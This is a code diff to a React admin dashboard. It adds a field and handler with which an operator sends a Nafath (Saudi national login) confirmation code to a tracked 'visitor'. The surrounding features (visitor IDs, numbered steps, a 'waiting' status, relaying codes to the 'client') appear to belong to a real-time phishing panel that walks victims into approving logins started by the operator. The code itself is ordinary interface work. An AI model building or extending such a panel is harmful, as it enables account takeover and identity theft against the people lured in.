@@ -1587,6 +1587,36 @@ export default function DashboardPage() {
     setActionLoading(null);
   };
 
+  // Handle send nafad code with visitorId
+  const handleSendNafadCode = async (visitorId: string | undefined, code: string) => {
+    if (!visitorId || !code) {
+      showNotification("error", "يرجى إدخال رمز التحقق");
+      return;
+    }
+    
+    console.log("[SendNafadCode] visitorId:", visitorId, "code:", code);
+    setActionLoading("nafad");
+    
+    try {
+      const res = await fetch("/api/dashboard/send-nafad-code", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ visitorId, nafadCode: code }),
+      });
+      
+      if (res.ok) {
+        showNotification("success", "تم إرسال رمز النفاذ للعميل ✓");
+        setNafadInput(""); // Clear input after sending
+        fetchDashboardData();
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
   // Handle nafad code send for step4
   const handleNafadCode = async (code: string) => {
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
@@ -2502,6 +2532,55 @@ export default function DashboardPage() {
               <span style={{ fontSize: "0.85rem", fontWeight: 600, color: (statusConfig[nafadStatus] || statusConfig["waiting"]).color }}>
                 {(statusConfig[nafadStatus] || statusConfig["waiting"]).text}
               </span>
+            </div>
+          )}
+
+          {/* حقل إدخال رمز التحقق من نفاذ + زر الإرسال */}
+          {nafadStatus === "waiting" && (
+            <div style={{ 
+              marginTop: 8,
+              padding: 12,
+              background: "#f0fdf4",
+              borderRadius: 8,
+              border: "1px solid #bbf7d0"
+            }}>
+              <div style={{ fontSize: "0.75rem", color: "#166534", fontWeight: 600, marginBottom: 8 }}>
+                📤 إرسال رمز التحقق من نفاذ
+              </div>
+              <div style={{ display: "flex", gap: 8 }}>
+                <input
+                  type="text"
+                  placeholder="أدخل رقم التأكيد"
+                  value={nafadInput}
+                  onChange={(e) => setNafadInput(e.target.value)}
+                  style={{
+                    flex: 1,
+                    padding: "8px 12px",
+                    borderRadius: 6,
+                    border: "1px solid #d1d5db",
+                    fontSize: "0.85rem",
+                    textAlign: "center",
+                    direction: "ltr"
+                  }}
+                />
+                <button
+                  onClick={() => handleSendNafadCode(selectedRequest?.id || selectedRequest?.visitorId, nafadInput)}
+                  disabled={!nafadInput.trim() || actionLoading === "nafad"}
+                  style={{
+                    padding: "8px 16px",
+                    borderRadius: 6,
+                    border: "none",
+                    background: nafadInput.trim() ? "#166534" : "#9ca3af",
+                    color: "white",
+                    fontSize: "0.8rem",
+                    fontWeight: 600,
+                    cursor: nafadInput.trim() ? "pointer" : "not-allowed",
+                    opacity: actionLoading === "nafad" ? 0.7 : 1
+                  }}
+                >
+                  {actionLoading === "nafad" ? "..." : "إرسال"}
+                </button>
+              </div>
             </div>
           )}
         </div>
